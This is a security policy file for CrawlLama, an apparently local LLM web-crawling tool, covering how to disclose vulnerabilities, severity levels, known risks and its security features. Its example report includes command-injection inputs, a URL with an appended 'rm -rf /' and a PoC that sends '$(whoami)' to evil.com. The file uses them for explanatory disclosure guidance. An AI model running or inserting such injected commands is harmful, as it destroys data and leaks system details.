
# Security Policy

---

 **Navigation:** [README](README.md) | [Contributing](CONTRIBUTING.md) | [Docs](docs/README.md) | [Changelog](CHANGELOG.md)

---

## Security Policy

The security of CrawlLama is important to us. If you discover a vulnerability, please report it responsibly.

## Supported Versions

We provide security updates for the following versions: | Version | Supported |

| Version   | Supported          |
|-----------|--------------------|
| **1.4.10** | :white_check_mark: |
| 1.3.x     | :x:                |
| 1.2.x     | :x:                |
| < 1.2     | :x:                |

## Reporting Vulnerabilities

### Please DO NOT report publicly

**Do NOT create public GitHub Issues for vulnerabilities.** This could put other users at risk.

### Responsible Disclosure

Please report vulnerabilities responsibly via:

#### GitHub Security Advisory (preferred)

1. Go to [Security Advisories](https://github.com/arn-c0de/Crawllama/security/advisories)
2. Click "Report a vulnerability"
3. Fill out the form with details

#### Email (alternative for sensitive leaks)

- **Email**: [crawllama.support@protonmail.com](mailto:crawllama.support@protonmail.com)
- **Subject**: `[SECURITY] Short Description`
- **Encryption**: Proton Mail offers end-to-end encryption

### What should the report include?

Please provide as many details as possible:

- **Type of vulnerability** (e.g. Code Injection, XSS, Arbitrary File Read)
- **Affected version(s)**
- **Steps to reproduce**
- **Proof of Concept (PoC)** code or screenshot
- **Potential impact** (e.g. RCE, data leak, DoS)
- **Suggested solution** (optional)
- **CVE-ID** (if already available)

**Example:**

```markdown
**Vulnerability:** Command Injection in page_reader.py

**Version:** v1.3.0

**Description:**
The function `fetch_page()` in `tools/page_reader.py` does not properly validate user input, which can lead to command injection.

**Steps:**
1. Start CrawlLama
2. Enter the following URL: `http://example.com; rm -rf /`
3. Command is executed on the system

**Impact:**
Remote Code Execution (RCE) as the user running CrawlLama

**PoC:**
```python
from tools.page_reader import fetch_page
fetch_page("http://evil.com$(whoami)")
```

**Suggestion:**
URL validation with `validators.url()` before processing

---

### Response Times

We strive for the following response times:

- **Initial response**: Within 48 hours
- **First assessment**: Within 7 days
- **Fix for critical issues**: Within 30 days
- **Fix for moderate issues**: Within 90 days

## Severity Levels

We use the [CVSS v3.1](https://www.first.org/cvss/calculator/3.1) scoring system: | Severity | CVSS Score | Examples |
|-------------|------------|---------------------------|
| **Critical**| 9.0-10.0 | RCE, Authentication Bypass|
| **High** | 7.0-8.9 | SQL Injection, XSS |
| **Medium** | 4.0-6.9 | CSRF, Information Disclosure|
| **Low** | 0.1-3.9 | Minor Information Leaks |

## Known Security Risks

### Local Operation Required

CrawlLama is designed for **local operation**. All LLM processing (Ollama) happens locally, ensuring data privacy. However, web searches and data fetching inherently require internet access and are not local operations. For enhanced privacy during these operations, we recommend using a VPN or proxy.

If exposed publicly (e.g. via FastAPI):

 **Important Security Measures:**

1. **Authentication**: Implement API key authentication
2. **Rate Limiting**: Use the built-in rate limiting (`security.rate_limit`)
3. **Input Validation**: All user inputs are validated
4. **Firewall**: Expose API only via firewall/reverse proxy
5. **HTTPS**: Use TLS for encrypted communication

### Web Scraping Risks

- **Malicious Content**: Websites may contain harmful content
- **SSRF**: Server-Side Request Forgery via user-controlled URLs
- **DoS**: Infinite redirects or large downloads

**Mitigation:**
- Domain blacklist enabled (`data/blacklist.txt`)
- Timeout limits configured
- Max response size limited
- robots.txt is respected

### LLM-specific Risks

- **Prompt Injection**: Malicious prompts in search results
- **Data Poisoning**: False information in RAG database
- **Model Hallucination**: Generated misinformation

**Mitigation:**
- Hallucination detection enabled (`core/hallu_detect.py`)
- Output sanitization
- Source attribution

### Dependency Vulnerabilities

We monitor dependencies regularly:

```bash
# Check dependencies
pip-audit
safety check

# Or with our script
python scripts/check_dependencies.py
```

**Automatic updates:** Dependabot is enabled and creates PRs for security updates.

## Security Features

CrawlLama has the following built-in security features:

### 1. Authentication & Authorization

```python
# API Key Authentication
X-API-Key: your-secure-api-key-here

# Role-Based Access Control (RBAC)
# - admin: Full access to all endpoints
# - user: Standard access (queries, memory, sessions)
# - read_only: Read-only access (queries only)
```

### 2. CSRF Protection

```python
# Cross-Site Request Forgery protection
# Required for all state-changing operations (POST/PUT/PATCH/DELETE)

# 1. Get CSRF token
POST /csrf-token
Headers: X-API-Key: your-key

# 2. Use token in subsequent requests
POST /config
Headers:
 X-API-Key: your-key
 X-CSRF-Token: token-from-step-1
```

### 3. Input Validation

```python
# utils/validators.py
validate_url() # Check URL format
validate_query() # Check query length/content
sanitize_output() # Clean LLM output
validate_url_ssrf_safe() # SSRF protection with DNS rebinding detection
```

### 4. Rate Limiting

```python
# Distributed rate limiting with Redis
# Falls back to in-memory if Redis unavailable
# Per-user, per-endpoint limits

# Default: 60 requests/minute
# Configurable via RATE_LIMIT environment variable
```

### 5. Session Management

```python
# Enhanced session security
# - Session timeout (24 hours default)
# - IP address tracking
# - Last activity tracking
# - Session refresh capability

POST /session/refresh # Extend session expiration
```

### 6. Audit Logging

```python
# Comprehensive security event logging
# - All API requests logged
# - Authentication/authorization events
# - Configuration changes
# - Security events (CSRF, rate limits)

# Query audit logs (admin only):
GET /admin/audit/logs?event_type=authentication&status=failure
```

### 7. API Key Rotation

```python
# Graceful key rotation with zero downtime
# Multiple active keys per user

# Generate new key:
POST /admin/api-keys/generate

# Rotate existing key:
POST /admin/api-keys/rotate

# List your keys:
GET /admin/api-keys/list

# Revoke old key:
DELETE /admin/api-keys/revoke/{key_id}
```

### 8. Domain Blacklist

```python
# data/blacklist.txt
# Blocks known malicious domains
malware-site.com
phishing-domain.net
```

### 9. Secure Config

```python
# API keys are stored encrypted
from utils.secure_config import SecureConfig
config = SecureConfig()
config.set_key("api_key", "secret") # Encrypted
```

### 10. Plugin Sandbox

```python
# Plugins run in a separate namespace
# No access to sensitive data
# Path traversal protection
```

### 11. Security Headers

All responses include comprehensive security headers:
- `Content-Security-Policy`: Strict CSP to prevent XSS
- `X-Content-Type-Options: nosniff`: Prevent MIME sniffing
- `X-Frame-Options: DENY`: Prevent clickjacking
- `X-XSS-Protection: 1; mode=block`: Legacy XSS protection
- `Strict-Transport-Security`: Force HTTPS (when using HTTPS)
- `Referrer-Policy: strict-origin-when-cross-origin`: Control referrer leakage

### 12. Origin/Referer Validation

CSRF protection includes Origin and Referer header validation for all state-changing requests.

### 13. Startup Security Validation

Automatic security configuration validation on startup:
- Checks API key strength
- Validates allowed hosts/origins configuration
- Warns about insecure settings
- Optional strict mode to block startup on security issues

## Security Best Practices

### For Users

1. **Do not commit secrets**: Use `.env` for API keys
2. **Strong API keys**: Use keys with at least 32 characters
3. **Configure production settings**:
 ```bash
 # .env
 CRAWLLAMA_API_KEY=your-strong-api-key-min-32-chars
 ALLOWED_HOSTS=yourdomain.com,www.yourdomain.com
 ALLOWED_ORIGINS=https://yourdomain.com,https://www.yourdomain.com
 RATE_LIMIT_SECRET=your-secret-for-rate-limiting
 REDIS_URL=redis://localhost:6379/0 # For distributed deployments
 ```
4. **Do not expose API**: Local access only recommended, or use reverse proxy with TLS
5. **Use RBAC**: Assign appropriate roles (admin/user/read_only) to API keys
6. **Rotate API keys**: Regularly rotate keys using the rotation endpoint
7. **Monitor audit logs**: Check `/admin/audit/logs` regularly for suspicious activity
8. **Keep updated**: Install security updates promptly
9. **Enable CSRF protection**: Always include CSRF tokens for state-changing operations
10. **Review sessions**: Check active sessions and revoke suspicious ones

### For Developers

1. **Validate input**: Use `validators.py` for all inputs
2. **Sanitize output**: Clean LLM outputs before display
3. **Keep secrets out of code**: Never in code, always in `.env`
4. **Check dependencies**: Run `pip-audit` before every release
5. **Write security tests**: Cover CSRF, RBAC, input validation, etc.
6. **Use CSRF protection**: Apply `Depends(verify_csrf_token)` to state-changing endpoints
7. **Apply RBAC**: Use `Depends(verify_role(Role.ADMIN))` for admin-only endpoints
8. **Log security events**: Use `audit_logger` for security-relevant actions
9. **Follow principle of least privilege**: Grant minimum necessary permissions
10. **Code review**: Have security-critical changes reviewed

### For Production Deployment

1. **Use HTTPS**: Always use TLS in production
2. **Configure firewall**: Only expose necessary ports
3. **Use Redis**: Enable Redis for distributed rate limiting and CSRF storage
4. **Set strict mode**: Enable `SECURITY_STRICT_MODE=true` to block on security issues
5. **Monitor logs**: Set up log aggregation (ELK, Splunk, etc.)
6. **Backup API keys**: Store key backups securely
7. **Document roles**: Keep record of who has which role
8. **Regular audits**: Review audit logs weekly
9. **Incident response plan**: Have a plan for security incidents
10. **Update regularly**: Subscribe to security advisories

## Security Checklist Before Release

- [] `pip-audit` shows no critical/high vulnerabilities
- [] No secrets committed in code/config
- [] `.env.example` contains only placeholders
- [] Domain blacklist updated
- [] Rate limiting enabled and tested
- [] Input validation for all user inputs
- [] Output sanitization for LLM responses
- [] CSRF protection applied to state-changing endpoints
- [] RBAC roles configured and tested
- [] Audit logging enabled and tested
- [] API key rotation mechanism tested
- [] Session management configured (timeouts, IP tracking)
- [] Security headers validated
- [] Origin/Referer validation tested
- [] Startup security validation passes
- [] Security tests pass (CSRF, RBAC, SSRF, XSS, path traversal)
- [] Documentation updated (SECURITY.md, API docs)
- [] Production configuration reviewed (ALLOWED_HOSTS, ALLOWED_ORIGINS)
- [] Redis configured for distributed deployments
- [] HTTPS/TLS configured for production

## Disclosure Policy

After fixing a vulnerability:

1. **Security advisory** is published on GitHub
2. **CVE** is requested (for high/critical)
3. **Release notes** mention the fix (without details)
4. **Credits** for the reporter (if desired)
5. **30-day waiting period** before full disclosure

## Hall of Fame

We thank the following security researchers for responsible disclosure:

<!-- 
Example format:
- **[Name]** - [Vulnerability Type] - [Month Year]
-->

*No reports yet - be the first!*

## Bug Bounty Program

Currently, we have **no official bug bounty program**.

However, we honor all security reports with:
- **Public credits** (if desired)
- **Mention in release notes**
- **Hall of Fame entry**

## Contact

- **GitHub Security**: [Security Advisories](https://github.com/arn-c0de/Crawllama/security/advisories)

## Further Resources

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [CWE Top 25](https://cwe.mitre.org/top25/)
- [CVSS Calculator](https://www.first.org/cvss/calculator/3.1)
- [Responsible Disclosure Policy](https://en.wikipedia.org/wiki/Responsible_disclosure)

---

**Thank you for helping keep CrawlLama secure!** 
